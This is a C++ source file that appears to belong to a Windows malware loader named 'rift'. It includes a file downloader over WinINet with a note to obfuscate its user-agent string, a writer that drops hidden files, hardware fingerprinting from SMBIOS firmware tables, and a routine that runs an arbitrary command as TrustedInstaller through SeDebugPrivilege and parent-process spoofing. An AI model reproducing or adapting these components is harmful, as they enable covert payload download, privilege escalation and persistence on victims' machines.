#include "riftldr.h"

namespace utl {
	BOOL IIsUserAdmin() {
		SID* pSid;
		SID_IDENTIFIER_AUTHORITY sia = SECURITY_NT_AUTHORITY;
		BOOL bSId = AllocateAndInitializeSid(&sia, 2, SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, (PSID*)&pSid);
		if (bSId) {
			if (!CheckTokenMembership(NULL, pSid, &bSId))
				bSId = FALSE;

			FreeSid(pSid);
		}

		return bSId;
	}

	DEPRECATED void* AllocReadFileW( // Use FileMap Class instead
		_In_  PCWSTR  szFileName,
		_Out_ size_t* nFileSize
	) {
		void* pRet = NULL;
		HANDLE m_hFile = CreateFileW(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (m_hFile == INVALID_HANDLE_VALUE)
			return NULL;

		LARGE_INTEGER liFS;
		BOOL bT = GetFileSizeEx(m_hFile, &liFS);
		void* pFile;
		if (!bT || (liFS.HighPart || !liFS.LowPart))
			goto EXIT;

		pFile = VirtualAlloc(nullptr, liFS.LowPart, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
		if (!pFile)
			goto EXIT;

		bT = ReadFile(m_hFile, pFile, liFS.LowPart, (dword*)nFileSize, NULL);
		if (!bT) {
			free(pFile);
			goto EXIT;
		}

		pRet = pFile;
	EXIT:
		CloseHandle(m_hFile);
		return pRet;
	}

	BOOL WriteFileCW(
		_In_ PCWSTR pFileName,
		_In_ void*  pBuffer,
		_In_ size_t nBuffer
	) {
		HANDLE m_hFile = CreateFileW(pFileName, GENERIC_RW, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
		if (m_hFile) {
			dword dwT;
			BOOL bT = WriteFile(m_hFile, pBuffer, nBuffer, &dwT, NULL);
			CloseHandle(m_hFile);
			return bT;
		} else
			return FALSE;
	}

	DEPRECATED PCWSTR GetFileNameFromPathW(
		_In_ PCWSTR pPath
	) {
		for (uint32 i = wcslen(pPath); i > 2; i--)
			if (pPath[i - 1] == L'\\')
				return pPath + i;

		return nullptr;
	}

	class WinNet {
	public:
		WinNet(
			_In_ const wchar* szAgent = nullptr
		) {
			if (InternetAttemptConnect(NULL))
				return;
			if (!szAgent)
				szAgent = L"_rift/v0.xxy (WinINet_riftldrDl)"; // Use String Obfuscation here
			hNet = InternetOpenW(szAgent, INTERNET_OPEN_TYPE_DIRECT, nullptr, nullptr, NULL);
		}
		~WinNet() {
			InternetCloseHandle(hNet);
		}

		status DownloadFile(                      // returns actuall size read if successful
			_In_     const wchar* szUrl,          // Url to download from
			_Out_          void*  pBuffer,        // Output Buffer to fill
			_In_           size_t nSize,          // Size of data to read
			_In_opt_       ptr    fpOffset = NULL // Startposition to read from
		) {
			status s = InternetCheckConnectionW(szUrl, NULL, NULL);
			if (!s)
				return -1; // Couldn't connect to Url/Server

			HINTERNET hUrl = InternetOpenUrlW(hNet, szUrl, nullptr, 0, NULL, NULL);
			if (!hUrl)
				return -2; // Couldn't open Url

			if (fpOffset)
				InternetSetFilePointer(hUrl, fpOffset, nullptr, FILE_BEGIN, NULL);
			s = InternetReadFile(hUrl, pBuffer, nSize, (dword*)&nSize);
			status s2 = s;
			s = InternetCloseHandle(hUrl);
			if (!s2)
				return -3; // Couldn't read File
			return nSize;
		}
	private:
		HINTERNET hNet;
	};

	// so apperently all data im grabbing is different
	// so fuck me, this is basically a session Id now
	VOID IGenerateSessionId(
		_Out_ cry::Hash::hash* pSId
	) {
		// Prepare Hashing
		BCRYPT_ALG_HANDLE ah;
		BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, nullptr, NULL);
		BCRYPT_HASH_HANDLE hh;
		BCryptCreateHash(ah, &hh, nullptr, 0, nullptr, 0, NULL);

		static const dword dwFTPS[] = { 'ACPI', 'FIRM', 'RSMB' };
		for (uint8 i = 0; i < sizeof(dwFTPS) / sizeof(dword); i++) {
			// Enumerate Table Entries
			size_t nTableId = EnumSystemFirmwareTables(dwFTPS[i], nullptr, 0);
			dword* pTableId = (dword*)malloc(nTableId);
			EnumSystemFirmwareTables(dwFTPS[i], pTableId, nTableId);

			for (uchar j = 0; j < nTableId / sizeof(dword); j++) {
				// Get Table
				size_t nTable = GetSystemFirmwareTable(dwFTPS[i], pTableId[j], nullptr, 0);
				void* pTable = malloc(nTable);
				GetSystemFirmwareTable(dwFTPS[i], pTableId[j], pTable, nTable);

				// Hash Table
				BCryptHashData(hh, (uchar*)pTable, nTable, NULL);
				free(pTable);
			}

			free(pTableId);
		}

		// Finish Hashing
		BCryptFinishHash(hh, (uchar*)pSId, sizeof(cry::Hash::hash), NULL);
		BCryptDestroyHash(hh);
		BCryptCloseAlgorithmProvider(ah, NULL);
	}

	// this generates a true hardware Id by parsing the table
	// and only hashing specific entries (also avoiding specific fields)
	VOID IGenerateHardwareId(
		_Out_ cry::Hash::hash* pHwId
	) {
		// Get SMBios Table
		typedef struct _RawSMBIOSData {
			byte  Used20CallingMethod;
			byte  SMBIOSMajorVersion;
			byte  SMBIOSMinorVersion;
			byte  DmiRevision;
			dword Length;
			byte  SMBIOSTableData[];
		} SMBIOS, * PSMBIOS;
		dword dwTable;
		EnumSystemFirmwareTables('RSMB', &dwTable, sizeof(dwTable));
		size_t nTable = GetSystemFirmwareTable('RSMB', dwTable, NULL, 0);
		PSMBIOS smTable = (SMBIOS*)malloc(nTable);
		GetSystemFirmwareTable('RSMB', dwTable, smTable, nTable);

		// Prepare Hashing
		BCRYPT_ALG_HANDLE ah;
		BCryptOpenAlgorithmProvider(&ah, BCRYPT_MD5_ALGORITHM, NULL, NULL);
		BCRYPT_HASH_HANDLE hh;
		BCryptCreateHash(ah, &hh, NULL, 0, NULL, 0, NULL);

		// Get First Entry
		typedef struct _SMBIOSTableHeader {
			byte bType;
			byte nLength;
			WORD wHandle;
		} SMTABLEHDR, * PSMTABLEHDR;
		PSMTABLEHDR pEntry = (SMTABLEHDR*)smTable->SMBIOSTableData;
		while (pEntry->bType != 127) {
			// Start of String Table
			void* pStringTable = (void*)((ptr)pEntry + pEntry->nLength);

			// Get Entry Size and next Entry Address
			while (*((PWORD)pStringTable) != (WORD)0x0000)
				(*(ptr*)&pStringTable)++;
			size_t nEntry = ((ptr)pStringTable + 2) - (ptr)pEntry;

			// Test if Entry should be hashed
			const byte bTypes[] = {
				0x00, // BIOS            : O
				0x04, // Processor       : S
				0x07, // Cache           : O
				0x08, // Ports           : O
				0x09, // Slots           : O
				0x10, // Physical Memory : O
				0x11, // Memory Devices  : O
				0x02  // Baseboard       : X
			};
			for (uchar i = 0; i < sizeof(bTypes); i++) {
				if (pEntry->bType == bTypes[i]) {
					if (pEntry->bType == 4) {
						// Avoid "Current Speed" Field
						BCryptHashData(hh, (uchar*)pEntry, 0x16, NULL);
						BCryptHashData(hh, (uchar*)pEntry + 0x18, nEntry - 0x18, NULL);
					} else
						BCryptHashData(hh, (uchar*)pEntry, nEntry, NULL);
					break;
				}
			}

			// Set Address of next Entry
			*(ptr*)&pEntry += nEntry;
		}

		// Finish Hashing
		BCryptFinishHash(hh, (uchar*)pHwId, sizeof(*pHwId), NULL);
		BCryptDestroyHash(hh);
		BCryptCloseAlgorithmProvider(ah, NULL);
		free(smTable);
	}

	BOOL ERunAsTrustedInstaller(
		_In_     PCWSTR szFileName,
		_In_     PCWSTR szCmdLine,
		_In_opt_ PCWSTR szDirectory
	) {
		// Open and Start TrustedInstaller Service
		SC_HANDLE hSCM = OpenSCManagerW(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
		BOOL LE = GetLastError();
		if (!hSCM)
			return LE;
		SC_HANDLE hSer = OpenServiceW(hSCM, L"TrustedInstaller", GENERIC_EXECUTE);
		LE = GetLastError();
		if (!hSer)
			return LE;
		BOOL bS = StartServiceW(hSer, NULL, NULL);

		// Open TrustedInstaller Process
		DWORD pProc = utl::GetPIdByNameW(L"TrustedInstaller.exe");
		bS = EAdjustPrivilege(SE_DEBUG_NAME, TRUE);
		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pProc);
		LE = GetLastError();

		// Setup StartupInformation
		STARTUPINFOEXW si;
		PROCESS_INFORMATION pi;
		ZeroMemory(&si, sizeof(si));
		si.StartupInfo.cb = sizeof(si);
		ZeroMemory(&pi, sizeof(pi));
		size_t nAttributeList;
		InitializeProcThreadAttributeList(NULL, 1, NULL, (SIZE_T*)&nAttributeList);
		si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(nAttributeList);
		InitializeProcThreadAttributeList(si.lpAttributeList, 1, NULL, (SIZE_T*)&nAttributeList);
		UpdateProcThreadAttribute(si.lpAttributeList, NULL, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL);

		// Launch Process Under TrustedInstaller
		PWSTR pCmdLineC;
		if (szCmdLine) {
			size_t nCmdLine = wcslen(szCmdLine);
			pCmdLineC = (PWSTR)malloc((nCmdLine + 1) * sizeof(WCHAR));
			CopyMemory(pCmdLineC, szCmdLine, (nCmdLine + 1) * sizeof(WCHAR));
		} else
			pCmdLineC = NULL;
		bS = CreateProcessW(szFileName, pCmdLineC, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, szDirectory, (STARTUPINFO*)&si, &pi);
		if (bS) {
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		} if (pCmdLineC)
			free(pCmdLineC);
		LE = GetLastError();
		// Stop Service
		SERVICE_STATUS ss;
		ControlService(hSer, SERVICE_CONTROL_STOP, &ss);
		CloseServiceHandle(hSer);
		CloseServiceHandle(hSCM);

		return 0;
	}
}
